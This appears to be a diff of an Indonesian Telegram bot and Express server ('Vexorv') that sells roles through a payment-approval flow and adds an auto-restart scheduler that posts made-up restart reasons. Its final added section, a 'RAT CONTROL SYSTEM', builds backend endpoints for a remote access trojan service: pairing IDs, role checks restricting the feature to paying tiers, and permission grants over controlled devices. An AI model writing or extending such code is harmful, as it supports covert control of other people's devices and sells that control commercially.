-  }
-}
-
-async function handleStoranApprove(approverId, storanId, action, query) {
-  console.log('[STORAN] Approve dipanggil:', { approverId, storanId, action });
-  
-  try {
+async function handleStoranApprove(approverId, storanId, action, ctx) {
     const storanData = loadStoranData();
     const index = storanData.pending.findIndex(s => s.id === storanId);
-    
-    console.log('[STORAN] Index ditemukan:', index);
-    
     if (index === -1) {
-      bot.answerCallbackQuery(query.id, { text: "Data tidak ditemukan." });
-      return bot.sendMessage(approverId, `<blockquote>❌ Data storan tidak ditemukan.</blockquote>`, { parse_mode: "HTML" });
+        await ctx.replyWithHTML(`<blockquote>❌ Data storan tidak ditemukan.</blockquote>`);
+        return;
     }
-    
     const pending = storanData.pending[index];
     const userId = pending.userId;
-    
-    console.log('[STORAN] Pending data:', { userId, package: pending.packageName, username: pending.username });
-    
+
     if (action === "tolak") {
-      try {
-        bot.sendMessage(userId, `<blockquote>❌ Bukti Trx DITOLAK!\n\nSilakan kirim ulang Bukti Trx yang benar.</blockquote>`, { parse_mode: "HTML" });
-      } catch (err) {
-        console.log('[ERROR] Gagal kirim ke user:', err.message);
-        bot.sendMessage(approverId, `<blockquote>⚠️ Gagal kirim notifikasi ke user ${userId}.\n\nPastikan user sudah chat dengan bot.</blockquote>`, { parse_mode: "HTML" });
-      }
-      
-      storanData.pending.splice(index, 1);
-      saveStoranData(storanData);
-      bot.answerCallbackQuery(query.id, { text: "✅ Storan ditolak." });
-      return bot.sendMessage(approverId, `<blockquote>✅ Storan ${storanId} telah DITOLAK.</blockquote>`, { parse_mode: "HTML" });
+        try { await bot.telegram.sendMessage(userId, `<blockquote>❌ Bukti Trx DITOLAK!</blockquote>`, { parse_mode: "HTML" }); } catch (err) {}
+        storanData.pending.splice(index, 1);
+        saveStoranData(storanData);
+        await ctx.replyWithHTML(`<blockquote>✅ Storan ${storanId} telah DITOLAK.</blockquote>`);
+        return;
     }
-    
-    // ===== ACTION = TERIMA =====
-    const qrCodeUrl = QR_CODE_PAYMENT;
+
     pending.step = "waiting_qr_ss";
     saveStoranData(storanData);
-    
-    // Kirim QR ke user
+
     try {
-      await bot.sendPhoto(userId, qrCodeUrl, {
-        caption: `<blockquote>✅ Bukti Transfer DITERIMA!\n\n📱 Scan QR Code di atas untuk transfer:\n\n📦 Paket: ${pending.packageName}\n👤 Username: ${pending.username}\n\n💰 Transfer 50% dari harga role paket.\n\n📌 Setelah transfer, kirim Bukti TF nya.</blockquote>`,
-        parse_mode: "HTML"
-      });
-      
-      bot.answerCallbackQuery(query.id, { text: "✅ Storan diterima, QR dikirim." });
-      bot.sendMessage(approverId, `<blockquote>✅ Storan ${storanId} DITERIMA.\nQR Code telah dikirim ke user.</blockquote>`, { parse_mode: "HTML" });
+        await bot.telegram.sendPhoto(userId, QR_CODE_PAYMENT, {
+            caption: `<blockquote>✅ Bukti Transfer DITERIMA!\n\n📱 Scan QR Code di atas untuk transfer:\n\n📦 Paket: ${pending.packageName}\n👤 Username: ${pending.username}\n\n💰 Transfer 50% dari harga role paket.\n\n📌 Setelah transfer, kirim Bukti TF nya.</blockquote>`,
+            parse_mode: "HTML"
+        });
+        await ctx.replyWithHTML(`<blockquote>✅ Storan ${storanId} DITERIMA. QR Code telah dikirim ke user.</blockquote>`);
     } catch (err) {
-      console.log('[ERROR] Gagal kirim QR:', err.message);
-      bot.sendMessage(approverId, `<blockquote>⚠️ Gagal kirim QR ke user ${userId}.\n\nPastikan user sudah chat dengan bot.\n\nError: ${err.message}</blockquote>`, { parse_mode: "HTML" });
-      storanData.pending.splice(index, 1);
-      saveStoranData(storanData);
-      bot.answerCallbackQuery(query.id, { text: "Gagal kirim QR." });
+        await ctx.replyWithHTML(`<blockquote>⚠️ Gagal kirim QR ke user. Pastikan user sudah chat dengan bot.</blockquote>`);
+        storanData.pending.splice(index, 1);
+        saveStoranData(storanData);
     }
-    
-  } catch (error) {
-    console.log('[ERROR] handleStoranApprove:', error.message);
-    console.log('[ERROR] Stack:', error.stack);
-    bot.answerCallbackQuery(query.id, { text: "Terjadi kesalahan." });
-    bot.sendMessage(approverId, `<blockquote>❌ Terjadi kesalahan: ${error.message}</blockquote>`, { parse_mode: "HTML" });
-  }
 }
 
-function handleStoranQrSS(chatId, userId, photoId) {
-  const storanData = loadStoranData();
-  const pending = storanData.pending.find(s => s.userId === userId && s.step === "waiting_qr_ss");
-  if (!pending) {
-    return bot.sendMessage(chatId, `<blockquote>❌ Tidak ada sesi storan aktif.</blockquote>`, { parse_mode: "HTML" });
-  }
-  pending.ssQrImage = photoId;
-  pending.step = "waiting_qr_approve";
-  saveStoranData(storanData);
-  
-  const config = loadTelegramConfig();
-  const approvers = [...(config.ownerList || []), ...(config.tkList || [])];
-  const caption = `<blockquote>📦 STORAN - Bukti TF\n\n🆔 ID: ${pending.id}\n👤 User: ${userId}\n📦 Paket: ${pending.packageName}\n👤 Username: ${pending.username}\n\n⏳ Menunggu persetujuan final...</blockquote>`;
-  
-  for (const approverId of approvers) {
-    bot.sendPhoto(approverId, pending.ssQrImage, {
-      caption: caption,
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [[
-          { text: "✅ Terima", callback_data: `storan_qr_terima_${pending.id}` },
-          { text: "❌ Tolak", callback_data: `storan_qr_tolak_${pending.id}` }
-        ]]
-      }
-    });
-  }
-  bot.sendMessage(chatId, `<blockquote>✅ Bukti TF terkirim! Menunggu persetujuan final...</blockquote>`, { parse_mode: "HTML" });
-}
-
-async function handleStoranQrApprove(approverId, storanId, action, query) {
-  try {
+async function handleStoranQrApprove(approverId, storanId, action, ctx) {
     const storanData = loadStoranData();
     const index = storanData.pending.findIndex(s => s.id === storanId);
-    
     if (index === -1) {
-      bot.answerCallbackQuery(query.id, { text: "Data tidak ditemukan." });
-      return bot.sendMessage(approverId, `<blockquote>❌ Data storan tidak ditemukan.</blockquote>`, { parse_mode: "HTML" });
+        await ctx.replyWithHTML(`<blockquote>❌ Data storan tidak ditemukan.</blockquote>`);
+        return;
     }
-    
     const pending = storanData.pending[index];
     const userId = pending.userId;
-    const targetId = pending.username; // Ini sekarang berisi ID
+    const targetId = pending.username;
     const packageKey = pending.package;
-    
-    console.log('[STORAN QR] Approve:', { approverId, storanId, action, targetId, packageKey });
-    
+
     if (action === "tolak") {
-      try {
-        bot.sendMessage(userId, `<blockquote>❌ Bukti TF DITOLAK!\n\nSilakan kirim ulang Bukti TF yang benar.</blockquote>`, { parse_mode: "HTML" });
-      } catch (err) {
-        console.log('[ERROR] Gagal kirim ke user:', err.message);
-        bot.sendMessage(approverId, `<blockquote>⚠️ Gagal kirim notifikasi ke user ${userId}.</blockquote>`, { parse_mode: "HTML" });
-      }
-      
-      pending.step = "waiting_qr_ss";
-      pending.ssQrImage = null;
-      saveStoranData(storanData);
-      bot.answerCallbackQuery(query.id, { text: "✅ Bukti TF ditolak" });
-      return bot.sendMessage(approverId, `<blockquote>✅ Bukti TF ${storanId} telah DITOLAK.</blockquote>`, { parse_mode: "HTML" });
+        try { await bot.telegram.sendMessage(userId, `<blockquote>❌ Bukti TF DITOLAK!</blockquote>`, { parse_mode: "HTML" }); } catch (err) {}
+        storanData.pending.splice(index, 1);
+        saveStoranData(storanData);
+        await ctx.replyWithHTML(`<blockquote>✅ Bukti TF ${storanId} telah DITOLAK.</blockquote>`);
+        return;
     }
-    
-    // ===== ACTION = TERIMA =====
+
     const targetTelegramId = parseInt(targetId);
-    
     if (isNaN(targetTelegramId)) {
-      bot.sendMessage(approverId, `<blockquote>❌ ID '${targetId}' tidak valid!</blockquote>`, { parse_mode: "HTML" });
-      storanData.pending.splice(index, 1);
-      saveStoranData(storanData);
-      return;
+        await ctx.replyWithHTML(`<blockquote>❌ ID '${targetId}' tidak valid!</blockquote>`);
+        storanData.pending.splice(index, 1);
+        saveStoranData(storanData);
+        return;
     }
-    
-    console.log('[STORAN QR] Target ID:', targetTelegramId);
-    
-    // ===== CEK PAKET MEMBER =====
-    if (packageKey === "member") {
-      const groupLink = config.GROUP_LINK;
-      
-      const config = loadTelegramConfig();
-      if (!config.userList) config.userList = [];
-      if (!config.userList.includes(targetTelegramId)) {
-        config.userList.push(targetTelegramId);
-        fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));
-      }
-      
-      try {
-        bot.sendMessage(userId, `<blockquote>✅ STORAN MEMBER SUKSES!\n\n🆔 ID: ${targetTelegramId}\n📦 Paket: MEMBER\n\n🔗 Link Grup Member:\n${groupLink}</blockquote>`, { parse_mode: "HTML" });
-      } catch (err) {
-        console.log('[ERROR] Gagal kirim ke user:', err.message);
-      }
-      
-      bot.sendMessage(approverId, `<blockquote>✅ STORAN MEMBER SELESAI!\n\n🆔 ${targetTelegramId}\n📦 MEMBER</blockquote>`, { parse_mode: "HTML" });
-      
-      storanData.pending.splice(index, 1);
-      saveStoranData(storanData);
-      bot.answerCallbackQuery(query.id, { text: "✅ Storan Member selesai!" });
-      return;
-    }
-    
-    // ===== PAKET RES/PT/OWNER/TK =====
-    const roleMap = {
-      res: "resList",
-      pt: "ptList",
-      owner: "ownerList",
-      tk: "tkList"
-    };
-    
-    const roleListKey = roleMap[packageKey];
-    if (!roleListKey) {
-      bot.sendMessage(approverId, `<blockquote>❌ Paket tidak dikenal!</blockquote>`, { parse_mode: "HTML" });
-      storanData.pending.splice(index, 1);
-      saveStoranData(storanData);
-      return;
-    }
-    
+
     const config = loadTelegramConfig();
-    
-    const currentList = config[roleListKey] || [];
-    if (currentList.includes(targetTelegramId)) {
-      try {
-        bot.sendMessage(userId, `<blockquote>❌ ID ${targetTelegramId} sudah memiliki role ${pending.packageName}!</blockquote>`, { parse_mode: "HTML" });
-      } catch (err) {
-        console.log('[ERROR] Gagal kirim ke user:', err.message);
-      }
-      bot.sendMessage(approverId, `<blockquote>❌ ID ${targetTelegramId} sudah memiliki role ${pending.packageName}!</blockquote>`, { parse_mode: "HTML" });
-      storanData.pending.splice(index, 1);
-      saveStoranData(storanData);
-      return;
-    }
-    
-    // TAMBAH ROLE
-    config[roleListKey].push(targetTelegramId);
-    fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));
-    
-    const roleLabel = {
-      res: "RES (Reseller)",
-      pt: "PT (Partner)",
-      owner: "OWNER",
-      tk: "TK"
+    const roleMap = {
+        member: "userList",
+        reseller: "resellerList",
+        vip: "vipList",
+        pt: "ptList",
+        owner: "ownerList",
+        developer: "devList"
     };
-    
-    try {
-      bot.sendMessage(userId, `<blockquote>✅ STORAN SUKSES!\n\n🆔 ID: ${targetTelegramId}\n📦 Paket: ${pending.packageName}\n🎯 Role: ${roleLabel[packageKey] || packageKey.toUpperCase()}</blockquote>`, { parse_mode: "HTML" });
-    } catch (err) {
-      console.log('[ERROR] Gagal kirim ke user:', err.message);
+    const roleListKey = roleMap[packageKey] || "userList";
+    if (!config[roleListKey]) config[roleListKey] = [];
+    if (!config[roleListKey].includes(targetTelegramId)) {
+        config[roleListKey].push(targetTelegramId);
+        fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));
     }
-    
-    bot.sendMessage(approverId, `<blockquote>✅ STORAN SELESAI!\n\n🆔 ${targetTelegramId}\n📦 ${pending.packageName}</blockquote>`, { parse_mode: "HTML" });
-    
+
+    try {
+        await bot.telegram.sendMessage(userId, `<blockquote>✅ STORAN SUKSES!\n\n🆔 ID: ${targetTelegramId}\n📦 Paket: ${pending.packageName}</blockquote>`, { parse_mode: "HTML" });
+    } catch (err) {}
+    await ctx.replyWithHTML(`<blockquote>✅ STORAN SELESAI!\n\n🆔 ${targetTelegramId}\n📦 ${pending.packageName}</blockquote>`);
     storanData.pending.splice(index, 1);
     saveStoranData(storanData);
-    bot.answerCallbackQuery(query.id, { text: "✅ Storan selesai!" });
-    
-  } catch (error) {
-    console.log('[ERROR] handleStoranQrApprove:', error.message);
-    bot.answerCallbackQuery(query.id, { text: "Terjadi kesalahan." });
-    bot.sendMessage(approverId, `<blockquote>❌ Terjadi kesalahan: ${error.message}</blockquote>`, { parse_mode: "HTML" });
-  }
 }
 
 bot.onText(/^\/?clear/, async (msg) => {
@@ -5541,7 +4878,7 @@ bot.onText(/^\/?clear/, async (msg) => {
   const isOwner = config.ownerList.includes(id);
 
   if (!isOwner) {
-    return bot.sendMessage(chatId, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ You are not authorized to execute this command.", { parse_mode: "Markdown" });
+    return bot.sendMessage(chatId, "❌ [ACCESS] *KETIK*\n\n⚠️ /ckey,name,999d,id_telegram.", { parse_mode: "Markdown" });
   }
 
   try {
@@ -5554,7 +4891,6 @@ bot.onText(/^\/?clear/, async (msg) => {
 
     for (const userFolder of userFolders) {
       const userPath = path.join(SESSION_PATH, userFolder);
-
       if (!fs.lstatSync(userPath).isDirectory()) continue;
 
       const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
@@ -5570,9 +4906,7 @@ bot.onText(/^\/?clear/, async (msg) => {
 
     bot.sendMessage(chatId, responseMsg, { parse_mode: "Markdown" });
     console.log(`[LOG] Purged ${deletedCount} junk folders.`);
-    
   } catch (err) {
-    console.error("[ERROR] Cleanup failed:", err);
     bot.sendMessage(chatId, "⚠️ [SYSTEM] *CRITICAL ERROR*\n\nFailed to execute cleanup script.", { parse_mode: "Markdown" });
   }
 });
@@ -5596,291 +4930,500 @@ bot.onText(/^\/?restart/, async (msg) => {
   }, 2000);
 });
 
-const GROUP_CHAT_ID = config.GROUP_CHAT_ID;
-
 setTimeout(() => {
-    const targetChatId = GROUP_CHAT_ID; 
+    const targetChatId = "-1003972861173"; 
     bot.sendMessage(targetChatId, "✅ [SERVER] *SERVICES ONLINE*\n\nSystem Status: *RUNNING*\nUptime: Just started\n✅ All systems operational.", { parse_mode: "Markdown" });
   }, 3000);
 
 function scheduleAutoClean() {
   const now = new Date();
-
-  // 00:00 WIB = 17:00 UTC
   const nextMidnight = new Date();
   nextMidnight.setUTCHours(17, 0, 0, 0);
 
-  // kalau sudah lewat, jadwalkan besok
   if (now >= nextMidnight) {
     nextMidnight.setUTCDate(nextMidnight.getUTCDate() + 1);
   }
 
   const delay = nextMidnight - now;
-
   setTimeout(() => {
     hapusIsiUserLogs();
-
-    // ulangi setiap hari tepat jam yang sama
     setInterval(hapusIsiUserLogs, 24 * 60 * 60 * 1000);
   }, delay);
 }
 
-// ===== COMMAND ROLE =====
+// ========== AUTO RESTART SYSTEM ==========
+let restartCount = 0;
+let serverStartTime = Date.now();
+const AUTO_RESTART_INTERVAL = 6 * 60 * 60 * 1000;
 
-// /addres - Tambah role RES
-bot.onText(/^\/addres\s+(\d+)/, (msg, match) => {
-  const chatId = msg.from.id;
-  const config = loadTelegramConfig();
-  const isOwner = config.ownerList.includes(chatId);
+function getFormattedDateTime() {
+    const now = new Date();
+    const tanggal = now.toLocaleDateString('id-ID', {
+        weekday: 'long',
+        day: 'numeric',
+        month: 'long',
+        year: 'numeric'
+    });
+    const waktu = now.toLocaleTimeString('id-ID', {
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit'
+    });
+    return { waktu, tanggal };
+}
 
-  if (!isOwner) {
-    return bot.sendMessage(chatId, `<blockquote>❌ ACCESS DENIED</blockquote>`, { parse_mode: "HTML" });
-  }
+function getUptime() {
+    const uptimeMs = Date.now() - serverStartTime;
+    const seconds = Math.floor(uptimeMs / 1000);
+    const days = Math.floor(seconds / 86400);
+    const hours = Math.floor((seconds % 86400) / 3600);
+    const minutes = Math.floor((seconds % 3600) / 60);
+    const secs = seconds % 60;
+    
+    let result = '';
+    if (days > 0) result += `${days}d `;
+    if (hours > 0 || days > 0) result += `${hours}h `;
+    if (minutes > 0 || hours > 0 || days > 0) result += `${minutes}m `;
+    result += `${secs}s`;
+    return result;
+}
 
-  const targetId = parseInt(match[1]);
-  if (config.resList && config.resList.includes(targetId)) {
-    return bot.sendMessage(chatId, `<blockquote>❌ User already has RES role.</blockquote>`, { parse_mode: "HTML" });
-  }
+function getRestartReason() {
+    const reasons = [
+        "Scheduled maintenance",
+        "Memory optimization",
+        "Cache cleanup",
+        "Session refresh",
+        "Performance enhancement"
+    ];
+    return reasons[restartCount % reasons.length];
+}
 
-  if (!config.resList) config.resList = [];
-  config.resList.push(targetId);
-  fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));
+function buildRestartMessage() {
+    const { waktu, tanggal } = getFormattedDateTime();
+    const uptime = getUptime();
+    const reason = getRestartReason();
+    
+    return `
+╔══════════════════════════════╗
+║   🔄  AUTO RESTART SERVER   ║
+╚══════════════════════════════╝
 
-  bot.sendMessage(chatId, `<blockquote>✅ Done Add\n\nUser ID: ${targetId}\nRole: RES (Reseller)</blockquote>`, { parse_mode: "HTML" });
-});
+⏰ Waktu     : ${waktu}
+📅 Tanggal   : ${tanggal}
+🔁 Restart ke: ${restartCount + 1}
+⏳ Uptime    : ${uptime}
 
-// /addpt - Tambah role PT
-bot.onText(/^\/addpt\s+(\d+)/, (msg, match) => {
-  const chatId = msg.from.id;
-  const config = loadTelegramConfig();
-  const isRes = config.resList && config.resList.includes(chatId);
-  const isOwner = config.ownerList.includes(chatId);
+♻️ Status    : 🔄 RESTARTING
+🛡️ Alasan    : ${reason}
 
-  if (!isRes && !isOwner) {
-    return bot.sendMessage(chatId, `<blockquote>❌ ACCESS DENIED</blockquote>`, { parse_mode: "HTML" });
-  }
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-  const targetId = parseInt(match[1]);
-  if (config.ptList && config.ptList.includes(targetId)) {
-    return bot.sendMessage(chatId, `<blockquote>❌ User already has PT role.</blockquote>`, { parse_mode: "HTML" });
-  }
+💡 Server akan kembali aktif dalam beberapa detik.
+`;
+}
 
-  if (!config.ptList) config.ptList = [];
-  config.ptList.push(targetId);
-  fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));
-
-  bot.sendMessage(chatId, `<blockquote>✅ Done Add\n\nUser ID: ${targetId}\nRole: PT (Partner)</blockquote>`, { parse_mode: "HTML" });
-});
-
-bot.onText(/^\/addowner\s+(\d+)/, (msg, match) => {
-  const chatId = msg.from.id;
-  const config = loadTelegramConfig();
-  const isOwner = config.ownerList && config.ownerList.includes(chatId);
-  const isTk = config.tkList && config.tkList.includes(chatId);
-
-  if (!isOwner && !isTk) {
-    return bot.sendMessage(chatId, `<blockquote>❌ ACCESS DENIED\n\nHanya OWNER atau TK yang bisa menambah OWNER.</blockquote>`, { parse_mode: "HTML" });
-  }
-
-  const targetId = parseInt(match[1]);
-  if (config.ownerList && config.ownerList.includes(targetId)) {
-    return bot.sendMessage(chatId, `<blockquote>❌ User already has OWNER role.</blockquote>`, { parse_mode: "HTML" });
-  }
-
-  if (!config.ownerList) config.ownerList = [];
-  config.ownerList.push(targetId);
-  fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));
-
-  bot.sendMessage(chatId, `<blockquote>✅ Done Add\n\nUser ID: ${targetId}\nRole: OWNER</blockquote>`, { parse_mode: "HTML" });
-});
-
-// /addtk - Tambah role TK
-bot.onText(/^\/addtk\s+(\d+)/, (msg, match) => {
-  const chatId = msg.from.id;
-  const config = loadTelegramConfig();
-  const isTk = config.tkList && config.tkList.includes(chatId);
-
-  if (!isTk) {
-    return bot.sendMessage(chatId, `<blockquote>❌ ACCESS DENIED\n\nHanya TK yang bisa menambah TK.</blockquote>`, { parse_mode: "HTML" });
-  }
-
-  const targetId = parseInt(match[1]);
-  if (config.tkList && config.tkList.includes(targetId)) {
-    return bot.sendMessage(chatId, `<blockquote>❌ User already has TK role.</blockquote>`, { parse_mode: "HTML" });
-  }
-
-  if (!config.tkList) config.tkList = [];
-  config.tkList.push(targetId);
-  fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));
-
-  bot.sendMessage(chatId, `<blockquote>✅ Done Add\n\nUser ID: ${targetId}\nRole: TK</blockquote>`, { parse_mode: "HTML" });
-});
-
-// ===== CEK ROLE =====
-bot.onText(/^\/info$/, (msg) => {
-  const chatId = msg.from.id;
-  const config = loadTelegramConfig();
-
-  let role = "User";
-  if (config.tkList && config.tkList.includes(chatId)) role = "TK";
-  else if (config.ownerList && config.ownerList.includes(chatId)) role = "Owner";
-  else if (config.ptList && config.ptList.includes(chatId)) role = "PT";
-  else if (config.resList && config.resList.includes(chatId)) role = "RES";
-  else if (config.userList && config.userList.includes(chatId)) role = "User";
-
-  const userInfo = `<blockquote>👤 Informasi User\n\n📌 Nama: ${msg.from.first_name || '-'}\n🆔 ID: ${chatId}\n🎯 Role: ${role}</blockquote>`;
-
-  bot.sendMessage(chatId, userInfo, { parse_mode: "HTML" });
-});
-
-// ========== TAMBAHKAN INI DI ATAS APP.LISTEN ==========
-app.use(cors()); 
-app.use(bodyParser.json({ limit: '500mb' })); 
-
-const TARGETS_FILE = './targets.json';
-const NOTIF_FILE = './notifications.json';
-const COMMANDS_FILE = './commands.json';
-const RESPONSES_FILE = './responses.json';
-
-const readData = (file) => {
-    if (!fs.existsSync(file)) return [];
+async function sendRestartNotification() {
+    const message = buildRestartMessage();
+    console.log('[AUTO RESTART]', message);
+    
     try {
-        const content = fs.readFileSync(file, 'utf8');
-        return JSON.parse(content || '[]');
-    } catch (e) { return []; }
-};
+        if (TARGET_GROUP_ID) {
+            await sendWithPhoto(TARGET_GROUP_ID, message);
+        }
+        await bot.sendMessage(OWNER_ID, message, { parse_mode: 'HTML' });
+    } catch (e) {
+        console.error('[AUTO RESTART] Gagal kirim notifikasi:', e.message);
+    }
+}
 
-const saveData = (file, data) => {
+function performAutoRestart() {
+    restartCount++;
+    console.log(`[AUTO RESTART] Memulai restart ke-${restartCount}...`);
+    
+    sendRestartNotification().then(() => {
+        setTimeout(() => {
+            console.log('[AUTO RESTART] Melakukan restart server...');
+            serverStartTime = Date.now();
+            disconnectAllVPS();
+            disconnectAllActiveConnections().then(() => {
+                console.log('[AUTO RESTART] Server restart selesai, semua koneksi ditutup.');
+                setTimeout(() => {
+                    console.log('[AUTO RESTART] Menghubungkan ulang sessions...');
+                    startVipSessions();
+                    startUserSessions();
+                    connectToAllVPS();
+                    console.log('[AUTO RESTART] Server kembali online!');
+                    
+                    const onlineMsg = `
+╔══════════════════════════════╗
+║   ✅  SERVER BACK ONLINE    ║
+╚══════════════════════════════╝
+
+⏰ Waktu     : ${new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
+📅 Tanggal   : ${new Date().toLocaleDateString('id-ID', { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric' })}
+🔄 Restart ke: ${restartCount}
+
+♻️ Status    : ✅ ONLINE
+🛡️ System    : Vexorv Server
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+💡 Server siap digunakan kembali.
+`;
+                    sendWithPhoto(TARGET_GROUP_ID, onlineMsg).catch(() => {});
+                }, 3000);
+            });
+        }, 3000);
+    }).catch((e) => {
+        console.error('[AUTO RESTART] Error:', e.message);
+    });
+}
+
+function scheduleAutoRestart() {
+    console.log(`[AUTO RESTART] Auto restart dijadwalkan setiap ${AUTO_RESTART_INTERVAL / 3600000} jam.`);
+    setInterval(performAutoRestart, AUTO_RESTART_INTERVAL);
+}
+
+scheduleAutoRestart();
+
+async function autoRefresh() {
+  console.log('[AUTO REFRESH] Menjalankan refresh sessions...');
+  try {
+    await startUserSessions();
+    await startVipSessions();
+    console.log('[AUTO REFRESH] Sessions berhasil direfresh.');
+  } catch (err) {
+    console.error('[AUTO REFRESH] Error:', err.message);
+  }
+}
+
+console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+console.log(`    VEXORV - SERVER   `);
+console.log(`    STATUS : ACTIVE          `);
+console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+
+// ===== START SERVER =====
+console.log(`🚀 Server aktif di http://${Domain}:${PORT}`);
+startVipSessions();
+startUserSessions();
+
+console.log(`[AUTO REFRESH] Diatur setiap 30 menit sekali.`);
+setInterval(autoRefresh, THIRTY_MINUTES);
+console.log(`[AUTOCLEAN LOGS] Diatur setiap jam 12 malam WIB.`);
+scheduleAutoClean();
+
+// ============================================================
+// END OF INDEX.JS
+// ============================================================
+
+// ════════════════════════════════════════════════════════════════════════════
+// ██████████  RAT CONTROL SYSTEM  ██████████████████████████████████████████
+// ════════════════════════════════════════════════════════════════════════════
+
+const RAT_TARGETS = './rat_targets.json';
+const RAT_LIVE    = {};
+const RAT_ALLOWED = ['owner','high owner','high admin','admin','vip','reseller'];
+
+function readRat(f) {
+  try { return JSON.parse(fs.existsSync(f) ? fs.readFileSync(f,'utf8')||'[]' : '[]'); } catch { return []; }
+}
+function saveRat(f,d) { try { fs.writeFileSync(f, JSON.stringify(d,null,2)); } catch(_) {} }
+function genPairId() { return crypto.randomBytes(8).toString('hex').toUpperCase(); }
+
+// ── Role Guard: blok member ─────────────────────────────────────────────────
+function ratGuard(req, res, next) {
+  const key = req.query.key || req.body?.key;
+
+  const user = getUserByKey(key);
+
+  if (!user) {
+    return res.json({
+      valid: false,
+      message: 'Invalid key'
+    });
+  }
+
+  const role = (user.role || '').toLowerCase();
+
+  if (!RAT_ALLOWED.includes(role)) {
+    return res.json({
+      valid: false,
+      message: 'Akses ditolak. Fitur RAT hanya untuk Owner, Admin, VIP, dan Reseller.'
+    });
+  }
+
+  req._ratUser = user;
+  next();
+}
+
+// ── Startup: generate pairId untuk semua user yang belum punya ──────────────
+(function generateAllPairIds() {
+  try {
+    const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
+    let changed = false;
+    for (let i = 0; i < db.length; i++) {
+      if (!db[i].pairId) { db[i].pairId = genPairId(); changed = true; console.log(`[RAT-STARTUP] pairId generated: ${db[i].username} → ${db[i].pairId}`); }
+    }
+    if (changed) fs.writeFileSync('./database.json', JSON.stringify(db,null,2));
+    else console.log('[RAT-STARTUP] All users already have pairId');
+  } catch(e) { console.error('[RAT-STARTUP] Error:', e.message); }
+})();
+
+// ── Device Permission Endpoints ─────────────────────────────────────────────
+app.get('/devicePerms', ratGuard, (req, res) => {
+  const { username } = req.query;
+  const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '{}');
+  const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
+  const role = (req._ratUser.role||'').toLowerCase();
+  const isHighRole = ['owner','high owner','high admin','admin','reseller','vip'].includes(role);
+  // Jika yang dicek adalah diri sendiri dan role tinggi → auto approve
+  if (isHighRole && (!username || username === req._ratUser.username)) {
+    return res.json({ valid: true, approved: true, allDevices: true, devices: [] });
+  }
+  const ownerPerms = perms[req._ratUser.username] || {};
+  const targetPerm = ownerPerms[username] || { approved: false, allDevices: false, devices: [] };
+  res.json({ valid: true, ...targetPerm });
+});
+
+app.post('/setDevicePerm', ratGuard, (req, res) => {
+  const { username, approved, allDevices, devices } = req.body;
+  const role = (req._ratUser.role||'').toLowerCase();
+  const canSetPerm = ['owner','high owner','high admin','admin','reseller','vip'].includes(role);
+  if (!canSetPerm) return res.json({ valid: false, message: 'Role tidak diizinkan set permission' });
+  const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
+  if (!perms[req._ratUser.username]) perms[req._ratUser.username] = {};
+  perms[req._ratUser.username][username] = { approved: !!approved, allDevices: !!allDevices, devices: devices||[] };
+  fs.writeFileSync('./rat_perms.json', JSON.stringify(perms,null,2));
+  res.json({ valid: true });
+});
+
+app.get('/listDevicePerms', ratGuard, (req, res) => {
+  const role = (req._ratUser.role||'').toLowerCase();
+  const canList = ['owner','high owner','high admin','admin','reseller','vip'].includes(role);
+  if (!canList) return res.json({ valid: false, message: 'Role tidak diizinkan' });
+  const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
+  res.json({ valid: true, perms: perms[req._ratUser.username] || {} });
+});
+
+app.get('/api/device/getPerms',  ratGuard, (req, res) => { req.url = '/devicePerms?'   + (req.url.split('?')[1]||''); app.handle(req, res); });
+app.post('/api/device/setPerm',  ratGuard, (req, res) => { req.url = '/setDevicePerm?' + (req.url.split('?')[1]||''); app.handle(req, res); });
+app.get('/api/device/listPerms', ratGuard, (req, res) => { req.url = '/listDevicePerms?'+(req.url.split('?')[1]||''); app.handle(req, res); });
+
+// ── RAT Core Endpoints ──────────────────────────────────────────────────────
+app.get('/rat/pairid', ratGuard, (req, res) => {
+  const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
+  const idx = db.findIndex(u => u.username === req._ratUser.username);
+  if (idx === -1) return res.json({ valid: false, message: 'User not found' });
+  if (!db[idx].pairId) { db[idx].pairId = genPairId(); fs.writeFileSync('./database.json', JSON.stringify(db,null,2)); }
+  res.json({ valid: true, pairId: db[idx].pairId });
+});
+
+app.post('/rat/grant-member', ratGuard, (req, res) => {
+  const role = (req._ratUser.role||'').toLowerCase();
+  const canGrant = ['owner','high owner','high admin','admin','reseller','vip'].includes(role);
+  if (!canGrant) return res.json({ valid: false, message: 'Role tidak diizinkan grant akses' });
+  const { memberUsername } = req.body;
+  const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
+  if (!perms[req._ratUser.username]) perms[req._ratUser.username] = {};
+  perms[req._ratUser.username][memberUsername] = { approved: true, allDevices: true, devices: [] };
+  fs.writeFileSync('./rat_perms.json', JSON.stringify(perms,null,2));
+  res.json({ valid: true });
+});
+
